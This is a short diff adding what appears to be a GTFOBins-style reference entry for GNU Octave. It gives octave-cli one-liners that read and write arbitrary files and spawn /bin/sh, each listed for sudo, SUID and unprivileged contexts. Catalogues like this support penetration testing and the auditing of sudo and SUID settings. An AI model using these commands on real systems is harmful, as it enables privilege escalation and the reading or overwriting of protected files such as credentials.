@@ -1,0 +1,38 @@
+octave
+======
+
+File read
+---------
+
+[Sudo]
+    octave-cli --eval 'format none; fid = fopen("/path/to/input-file"); while(!feof(fid)); txt = fgetl(fid); disp(txt); endwhile; fclose(fid);'
+
+[SUID]
+    octave-cli --eval 'format none; fid = fopen("/path/to/input-file"); while(!feof(fid)); txt = fgetl(fid); disp(txt); endwhile; fclose(fid);'
+
+[Unprivileged]
+    octave-cli --eval 'format none; fid = fopen("/path/to/input-file"); while(!feof(fid)); txt = fgetl(fid); disp(txt); endwhile; fclose(fid);'
+
+File write
+----------
+
+[Sudo]
+    octave-cli --eval 'fid = fopen("/path/to/output-file", "w"); fputs(fid, "DATA"); fclose(fid);'
+
+[SUID]
+    octave-cli --eval 'fid = fopen("/path/to/output-file", "w"); fputs(fid, "DATA"); fclose(fid);'
+
+[Unprivileged]
+    octave-cli --eval 'fid = fopen("/path/to/output-file", "w"); fputs(fid, "DATA"); fclose(fid);'
+
+Shell
+-----
+
+[Sudo]
+    octave-cli --eval 'system("/bin/sh")'
+
+[SUID]
+    octave-cli --eval 'system("/bin/sh")'
+
+[Unprivileged]
+    octave-cli --eval 'system("/bin/sh")'
